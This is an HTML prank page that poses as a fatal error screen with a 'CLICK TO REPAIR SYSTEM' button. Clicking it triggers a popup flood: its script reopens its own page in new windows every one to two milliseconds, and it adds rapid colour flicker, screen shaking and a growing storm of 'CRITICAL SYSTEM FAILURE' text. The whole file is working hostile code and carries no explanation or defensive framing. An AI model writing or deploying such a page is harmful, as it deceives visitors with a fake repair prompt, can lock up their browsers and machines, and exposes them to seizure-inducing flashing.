<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>FATAL ERROR</title>
<style>
html, body {
    margin: 0;
    width: 100%;
    height: 100%;
    background: black;
    color: red;
    font-family: Arial, sans-serif;
    overflow: hidden;
}

h1 {
    animation: blink 0.1s infinite;
}

@keyframes blink {
    0% { color: red; }
    50% { color: white; }
    100% { color: red; }
}
</style>
</head>
<body>

<h1 onclick="start()">CLICK TO REPAIR SYSTEM</h1>

<script>
let x = 0;
let y = 0;
let dx = 80;
let dy = 60;

const w = 220;
const h = 160;

function start() {
    document.body.innerHTML = "<h1>DO NOT CLOSE</h1>";

    const sw = screen.width;
    const sh = screen.height;

    // INSANE WINDOW FLOOD
    setInterval(() => {
        for (let i = 0; i < 10; i++) {
            window.open(
                location.href,
                "_blank",
                `width=${w},height=${h},left=${x},top=${y}`
            );

            x += dx;
            y += dy;

            if (x > sw || x < 0) dx *= -1;
            if (y > sh || y < 0) dy *= -1;
        }
    }, 1); // 1ms

    // RANDOM SCREEN ATTACK
    setInterval(() => {
        window.open(
            location.href,
            "_blank",
            `width=${Math.random()*400+100},
             height=${Math.random()*300+100},
             left=${Math.random()*sw},
             top=${Math.random()*sh}`
        );
    }, 2);

    // BACKGROUND FLICKER
    setInterval(() => {
        document.body.style.background =
            `rgb(${Math.random()*255},
                 ${Math.random()*255},
                 ${Math.random()*255})`;
    }, 30);

    // SCREEN SHAKE
    setInterval(() => {
        document.body.style.transform =
            `translate(${Math.random()*40-20}px,
                       ${Math.random()*40-20}px)`;
    }, 20);

    // ERROR TEXT STORM
    setInterval(() => {
        const e = document.createElement("div");
        e.textContent = "CRITICAL SYSTEM FAILURE";
        e.style.position = "absolute";
        e.style.left = Math.random()*innerWidth + "px";
        e.style.top = Math.random()*innerHeight + "px";
        e.style.color = "red";
        e.style.fontSize = "20px";
        document.body.appendChild(e);

        if (document.body.children.length > 500)
            document.body.removeChild(document.body.children[0]);
    }, 5);
}
</script>

</body>
</html>
